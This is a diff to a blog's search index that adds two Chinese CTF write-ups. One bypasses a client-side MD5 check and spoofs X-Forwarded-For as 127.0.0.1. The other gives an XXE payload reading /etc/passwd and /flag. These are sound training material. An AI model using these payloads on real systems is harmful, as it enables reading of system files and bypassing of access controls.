@@ -2075,4 +2075,49 @@
         <tag>CISCN</tag>
       </tags>
   </entry>
+  <entry>
+    <title>PYWebsite</title>
+    <url>/2022/03/21/PYWebsite/</url>
+    <content><![CDATA[<h1 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h1><p>进入页面就让我购买flag，还66块钱，心黑啊。</p>
+<p>查看网页源码，发现前端包含了授权码验证的代码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function enc(code)&#123;</span><br><span class="line">  hash = hex_md5(code);</span><br><span class="line">  return hash;</span><br><span class="line">&#125;</span><br><span class="line">function validate()&#123;</span><br><span class="line">  var code = document.getElementById(&quot;vcode&quot;).value;</span><br><span class="line">  if (code != &quot;&quot;)&#123;</span><br><span class="line">    if(hex_md5(code) == &quot;0cd4da0223c0b280829dc3ea458d655c&quot;)&#123;</span><br><span class="line">      alert(&quot;您通过了验证！&quot;);</span><br><span class="line">      window.location = &quot;./flag.php&quot;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      alert(&quot;你的授权码不正确！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    alert(&quot;请输入授权码&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>需要我们能输入的值的md5等于这个<code>0cd4da0223c0b280829dc3ea458d655c</code></p>
+<p>这个到md5解码网站解了一下，解不出来，那么我们就把他换掉</p>
+<p>复制他进入控制台，粘贴修改md5的值，修改成123456的md5<code>e10adc3949ba59abbe56e057f20f883e</code></p>
+<p>然后我们直接输入123456就可以进去flag.php页面（其实好像直接进入这个页面也没差，不管，这个方式帅一点）</p>
+<p>进去之后</p>
+<p>又有隐藏提示：</p>
+<p><img src="/2022/03/21/PYWebsite/1.png" alt="1"></p>
+<p>就差直接说把我们的ip构造成127.0.0.1了，直接添加XFF头，拿到flag</p>
+]]></content>
+      <tags>
+        <tag>MRCTF2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>FakeXML-cookboos</title>
+    <url>/2022/03/21/FakeXML-cookbook/</url>
+    <content><![CDATA[<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>本题主要考到xxe（xml外部实体注入）</p>
+<p><img src="/2022/03/21/FakeXML-cookbook/1.png" alt="1"></p>
+<p>进入题目给出了一个登录框，看起来很像是sql注入，但是题目提示是XML所以也就不看了，登录一下抓个包看看</p>
+<p><img src="/2022/03/21/FakeXML-cookbook/2.png" alt="1"></p>
+<p>可以看到这与一般的post登录框不同，这里传入参数是一种xml方式，所以漏洞点应该就在这里，我们可以定义一个实体，导入本地计算机里面根目录下面的flag文件，然后执行这个实体就行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;#声明一个xml文件</span><br><span class="line">&lt;!DOCTYPE test [  #声明此文件是test类型的文档</span><br><span class="line">  &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line"><span class="meta">  #</span><span class="bash">对file实体的声明&lt;!ENTITY 实体名称 <span class="string">&quot;实体内容&quot;</span>&gt;SYSTEM或者PUBLIC引入外部资源，表示实体来自本地还是公共计算机，&lt;!ENTITY 实体名称 SYSTEM <span class="string">&quot;URI/URL&quot;</span>&gt;或者&lt;!ENTITY 实体名称 PUBLIC <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后在文件里使用&file;调用这个实体，所以我们构造一个paiload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">        &lt;!ENTITY file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们在username中调用这个实体，他就会返回根目录下flag的内容：</p>
+<p><img src="/2022/03/21/FakeXML-cookbook/3.png" alt="1"></p>
+<p>​    </p>
+]]></content>
+      <tags>
+        <tag>NCTF2019</tag>
+      </tags>
+  </entry>
 </search>
